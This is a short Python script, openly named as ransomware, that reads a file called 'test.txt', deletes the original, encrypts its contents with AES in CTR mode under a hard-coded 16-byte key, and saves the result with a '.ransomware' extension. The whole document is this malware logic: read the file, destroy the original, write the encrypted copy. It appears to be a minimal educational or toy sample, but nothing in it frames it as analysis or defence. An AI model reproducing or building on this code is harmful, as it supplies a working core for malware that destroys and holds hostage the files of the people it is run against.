#!/usr/bin/python3

import pyaes
import os

# read file
file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remove file
os.remove(file_name)

# cryptography 
key = b'0123456789ABCDEF'	# this must have 16 characters
aes = pyaes.AESModeOfOperationCTR(key)
crypt_data = aes.encrypt(file_data)

# create file
new_file = file_name + ".ransomware"
new_file = open(new_file, "wb")
new_file.write(crypt_data)
new_file.close()
